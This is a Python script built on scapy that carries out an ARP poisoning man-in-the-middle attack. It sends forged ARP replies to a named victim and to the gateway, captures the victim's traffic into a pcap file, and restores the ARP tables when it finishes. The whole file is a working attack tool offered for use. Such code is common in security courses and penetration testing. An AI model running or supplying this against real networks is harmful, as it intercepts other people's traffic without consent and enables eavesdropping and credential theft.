import multiprocessing
from multiprocessing import Process
from scapy.all import ARP, Ether, conf, sendp, sniff, srp, wrpcap

import os
import sys
import time


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface='wlan0'):
        conf.iface = interface
        conf.verb = 0

        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface

        if self.victimmac is None:
            sys.exit(f'Could not resolve MAC of victim {victim} on {interface}.')
        if self.gatewaymac is None:
            sys.exit(f'Could not resolve MAC of gateway {gateway} on {interface}.')

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)

        # is-at ARP must be unicast to the host we are lying to, otherwise
        # scapy falls back to a broadcast frame and warns about it.
        frame_victim = Ether(dst=self.victimmac)/poison_victim
        frame_gateway = Ether(dst=self.gatewaymac)/poison_gateway

        print('Beginning the ARP poison. [CTRL-C to stop]')

        try:
            while True:
                sys.stdout.write('.')
                sys.stdout.flush()

                sendp(frame_victim, iface=self.interface, verbose=False)
                sendp(frame_gateway, iface=self.interface, verbose=False)

                time.sleep(2)

        except KeyboardInterrupt:
            pass

        finally:
            self.restore()

    def sniff(self, count=200, timeout=60):
        time.sleep(5)
        print(f'Sniffing up to {count} packets (max {timeout}s)')
        bpf_filter = "ip host %s" % self.victim

        # Without a timeout this blocks until count is reached, so a quiet
        # victim means the capture is never written to disk at all.
        packets = sniff(count=count, filter=bpf_filter,
                        iface=self.interface, timeout=timeout)

        if not packets:
            print('Got no packets. Is the victim generating traffic?')
        else:
            wrpcap('arper.pcap', packets)
            print(f'Got {len(packets)} packets, wrote arper.pcap')

        self.restore()

        self.poison_thread.terminate()

        print('Finished')

    def restore(self):
        print('Restoring ARP tables.....')

        sendp(Ether(dst=self.victimmac) /
              ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac,
                  pdst=self.victim, hwdst=self.victimmac),
              count=5, iface=self.interface, verbose=False)

        sendp(Ether(dst=self.gatewaymac) /
              ARP(op=2, psrc=self.victim, hwsrc=self.victimmac,
                  pdst=self.gateway, hwdst=self.gatewaymac),
              count=5, iface=self.interface, verbose=False)


if __name__ == '__main__':
    if len(sys.argv) != 4:
        sys.exit(f'Usage: {sys.argv[0]} <victim ip> <gateway ip> <interface>')

    if os.geteuid() != 0:
        sys.exit('Raw sockets require root. Run with sudo.')

    # Python 3.14 defaults to "forkserver" on Linux, which pickles self into
    # the child. Arper holds Process objects, which are not picklable, so we
    # ask for the fork semantics this design relies on.
    multiprocessing.set_start_method('fork')

    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])

    myarp = Arper(victim, gateway, interface)

    try:
        myarp.run()
        myarp.poison_thread.join()
        myarp.sniff_thread.join()

    except KeyboardInterrupt:
        print('\nStopping.')
        myarp.poison_thread.terminate()
        myarp.sniff_thread.terminate()
        myarp.restore()
